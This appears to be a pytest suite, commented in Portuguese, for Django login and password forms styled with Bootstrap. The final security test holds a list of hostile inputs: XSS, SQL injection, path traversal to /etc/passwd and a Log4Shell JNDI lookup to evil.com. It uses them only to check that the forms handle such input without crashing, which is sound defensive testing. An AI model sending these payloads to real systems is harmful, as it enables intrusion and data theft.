"""
Testes para os formulários do aplicativo core.

Testa os formulários customizados com Bootstrap incluindo validações,
campos obrigatórios e integração com o sistema de autenticação.
"""

import pytest
from django.contrib.auth import get_user_model
from django.contrib.auth.forms import AuthenticationForm, PasswordChangeForm, PasswordResetForm, SetPasswordForm
from core.forms import (
    BootstrapAuthenticationForm,
    BootstrapPasswordChangeForm, 
    BootstrapPasswordResetForm,
    BootstrapSetPasswordForm
)

User = get_user_model()


@pytest.mark.django_db
class TestBootstrapAuthenticationForm:
    """Testes para o formulário de autenticação com Bootstrap."""

    def test_form_inheritance(self):
        """Testa se o form herda do AuthenticationForm do Django."""
        assert issubclass(BootstrapAuthenticationForm, AuthenticationForm)

    def test_form_valid_credentials(self, user):
        """Testa o formulário com credenciais válidas."""
        form_data = {
            'username': user.username,
            'password': 'testpass123'
        }
        form = BootstrapAuthenticationForm(data=form_data)
        assert form.is_valid()

    def test_form_invalid_credentials(self, user):
        """Testa o formulário com credenciais inválidas."""
        form_data = {
            'username': user.username,
            'password': 'senhaerrada'
        }
        form = BootstrapAuthenticationForm(data=form_data)
        assert not form.is_valid()
        assert 'Please enter a correct username and password' in str(form.errors) or form.errors

    def test_form_empty_fields(self):
        """Testa o formulário com campos vazios."""
        form_data = {
            'username': '',
            'password': ''
        }
        form = BootstrapAuthenticationForm(data=form_data)
        assert not form.is_valid()
        assert 'username' in form.errors
        assert 'password' in form.errors

    def test_form_missing_username(self):
        """Testa o formulário sem username."""
        form_data = {
            'password': 'testpass123'
        }
        form = BootstrapAuthenticationForm(data=form_data)
        assert not form.is_valid()
        assert 'username' in form.errors

    def test_form_missing_password(self, user):
        """Testa o formulário sem password."""
        form_data = {
            'username': user.username
        }
        form = BootstrapAuthenticationForm(data=form_data)
        assert not form.is_valid()
        assert 'password' in form.errors

    def test_form_bootstrap_classes(self):
        """Testa se o formulário tem as classes Bootstrap aplicadas."""
        form = BootstrapAuthenticationForm()
        
        # Verifica se os campos têm os atributos de CSS corretos
        username_widget = form.fields['username'].widget
        password_widget = form.fields['password'].widget
        
        # Verifica se as classes Bootstrap estão sendo aplicadas
        assert hasattr(username_widget, 'attrs')
        assert hasattr(password_widget, 'attrs')


@pytest.mark.django_db
class TestBootstrapPasswordChangeForm:
    """Testes para o formulário de mudança de senha com Bootstrap."""

    def test_form_inheritance(self):
        """Testa se o form herda do PasswordChangeForm do Django."""
        assert issubclass(BootstrapPasswordChangeForm, PasswordChangeForm)

    def test_form_valid_password_change(self, user):
        """Testa a mudança de senha com dados válidos."""
        form_data = {
            'old_password': 'testpass123',
            'new_password1': 'novasenha123',
            'new_password2': 'novasenha123'
        }
        form = BootstrapPasswordChangeForm(user=user, data=form_data)
        assert form.is_valid()

    def test_form_wrong_old_password(self, user):
        """Testa com senha antiga incorreta."""
        form_data = {
            'old_password': 'senhaerrada',
            'new_password1': 'novasenha123',
            'new_password2': 'novasenha123'
        }
        form = BootstrapPasswordChangeForm(user=user, data=form_data)
        assert not form.is_valid()
        assert 'old_password' in form.errors

    def test_form_password_mismatch(self, user):
        """Testa com senhas novas que não coincidem."""
        form_data = {
            'old_password': 'testpass123',
            'new_password1': 'novasenha123',
            'new_password2': 'senhadiferente123'
        }
        form = BootstrapPasswordChangeForm(user=user, data=form_data)
        assert not form.is_valid()
        assert 'new_password2' in form.errors

    def test_form_weak_password(self, user):
        """Testa com senha nova muito fraca."""
        form_data = {
            'old_password': 'testpass123',
            'new_password1': '123',
            'new_password2': '123'
        }
        form = BootstrapPasswordChangeForm(user=user, data=form_data)
        assert not form.is_valid()

    def test_form_empty_fields(self, user):
        """Testa com campos vazios."""
        form_data = {
            'old_password': '',
            'new_password1': '',
            'new_password2': ''
        }
        form = BootstrapPasswordChangeForm(user=user, data=form_data)
        assert not form.is_valid()
        assert 'old_password' in form.errors
        assert 'new_password1' in form.errors


@pytest.mark.django_db
class TestBootstrapPasswordResetForm:
    """Testes para o formulário de reset de senha com Bootstrap."""

    def test_form_inheritance(self):
        """Testa se o form herda do PasswordResetForm do Django."""
        assert issubclass(BootstrapPasswordResetForm, PasswordResetForm)

    def test_form_valid_email(self, user):
        """Testa o formulário com email válido."""
        form_data = {
            'email': user.email
        }
        form = BootstrapPasswordResetForm(data=form_data)
        assert form.is_valid()

    def test_form_invalid_email_format(self):
        """Testa com formato de email inválido."""
        form_data = {
            'email': 'email_invalido'
        }
        form = BootstrapPasswordResetForm(data=form_data)
        assert not form.is_valid()
        assert 'email' in form.errors

    def test_form_empty_email(self):
        """Testa com campo email vazio."""
        form_data = {
            'email': ''
        }
        form = BootstrapPasswordResetForm(data=form_data)
        assert not form.is_valid()
        assert 'email' in form.errors

    def test_form_nonexistent_email(self):
        """Testa com email que não existe no sistema."""
        form_data = {
            'email': 'naoexiste@test.com'
        }
        form = BootstrapPasswordResetForm(data=form_data)
        # O form deve ser válido mesmo com email inexistente (por segurança)
        assert form.is_valid()


@pytest.mark.django_db
class TestBootstrapSetPasswordForm:
    """Testes para o formulário de definir nova senha com Bootstrap."""

    def test_form_inheritance(self):
        """Testa se o form herda do SetPasswordForm do Django."""
        assert issubclass(BootstrapSetPasswordForm, SetPasswordForm)

    def test_form_valid_password_set(self, user):
        """Testa a definição de nova senha com dados válidos."""
        form_data = {
            'new_password1': 'novissima123',
            'new_password2': 'novissima123'
        }
        form = BootstrapSetPasswordForm(user=user, data=form_data)
        assert form.is_valid()

    def test_form_password_mismatch(self, user):
        """Testa com senhas que não coincidem."""
        form_data = {
            'new_password1': 'novissima123',
            'new_password2': 'senhadiferente123'
        }
        form = BootstrapSetPasswordForm(user=user, data=form_data)
        assert not form.is_valid()
        assert 'new_password2' in form.errors

    def test_form_weak_password(self, user):
        """Testa com senha muito fraca."""
        form_data = {
            'new_password1': 'abc',
            'new_password2': 'abc'
        }
        form = BootstrapSetPasswordForm(user=user, data=form_data)
        assert not form.is_valid()

    def test_form_empty_fields(self, user):
        """Testa com campos vazios."""
        form_data = {
            'new_password1': '',
            'new_password2': ''
        }
        form = BootstrapSetPasswordForm(user=user, data=form_data)
        assert not form.is_valid()
        assert 'new_password1' in form.errors

    def test_form_common_password(self, user):
        """Testa com senha muito comum."""
        form_data = {
            'new_password1': 'password123',
            'new_password2': 'password123'
        }
        form = BootstrapSetPasswordForm(user=user, data=form_data)
        # Pode ou não ser válido dependendo das configurações de validação
        # O importante é que o form seja processado sem erro
        assert form.is_valid() or not form.is_valid()


@pytest.mark.django_db
class TestFormBootstrapIntegration:
    """Testes para integração com Bootstrap em todos os formulários."""

    def test_all_forms_have_bootstrap_classes(self):
        """Testa se todos os formulários customizados têm classes Bootstrap."""
        forms_to_test = [
            BootstrapAuthenticationForm(),
            BootstrapPasswordResetForm(),
        ]
        
        for form in forms_to_test:
            for field_name, field in form.fields.items():
                widget = field.widget
                # Verifica se o widget tem atributos (onde as classes CSS são definidas)
                assert hasattr(widget, 'attrs')

    def test_user_dependent_forms_with_user(self, user):
        """Testa formulários que dependem de um usuário."""
        user_dependent_forms = [
            BootstrapPasswordChangeForm(user=user),
            BootstrapSetPasswordForm(user=user),
        ]
        
        for form in user_dependent_forms:
            # Verifica se o formulário foi criado sem erro
            assert form is not None
            # Verifica se tem os campos esperados
            assert len(form.fields) > 0

    def test_form_field_attributes(self):
        """Testa atributos específicos dos campos dos formulários."""
        form = BootstrapAuthenticationForm()
        
        # Verifica se os campos têm os atributos corretos
        username_field = form.fields.get('username')
        password_field = form.fields.get('password')
        
        assert username_field is not None
        assert password_field is not None
        
        # Verifica se são campos obrigatórios
        assert username_field.required
        assert password_field.required


@pytest.mark.django_db
class TestFormSecurity:
    """Testes de segurança para os formulários."""

    def test_csrf_protection_applicable(self):
        """Verifica se os formulários são compatíveis com proteção CSRF."""
        # Todos os formulários Django devem ser compatíveis com CSRF
        forms = [
            BootstrapAuthenticationForm(),
            BootstrapPasswordResetForm(),
        ]
        
        for form in forms:
            # Verifica se o formulário pode ser renderizado (necessário para CSRF)
            assert str(form) is not None

    def test_password_fields_are_hidden(self, user):
        """Verifica se os campos de senha são do tipo password."""
        forms_with_passwords = [
            BootstrapAuthenticationForm(),
            BootstrapPasswordChangeForm(user=user),
            BootstrapSetPasswordForm(user=user),
        ]
        
        for form in forms_with_passwords:
            for field_name, field in form.fields.items():
                if 'password' in field_name.lower():
                    # Verifica se é um campo de senha (widget PasswordInput)
                    assert 'password' in str(type(field.widget)).lower()

    def test_form_validation_prevents_injection(self, user):
        """Testa se os formulários previnem tentativas básicas de injeção."""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            "'; DROP TABLE users; --",
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}'
        ]
        
        for malicious_input in malicious_inputs:
            # Testa no formulário de autenticação
            form_data = {
                'username': malicious_input,
                'password': malicious_input
            }
            form = BootstrapAuthenticationForm(data=form_data)
            
            # O formulário deve processar sem causar erro de sistema
            # (mesmo que seja inválido)
            try:
                is_valid = form.is_valid()
                # Se for válido ou inválido, o importante é não crashar
                assert isinstance(is_valid, bool)
            except Exception as e:
                # Não deve haver exception não tratada
                pytest.fail(f"Form should handle malicious input gracefully: {e}")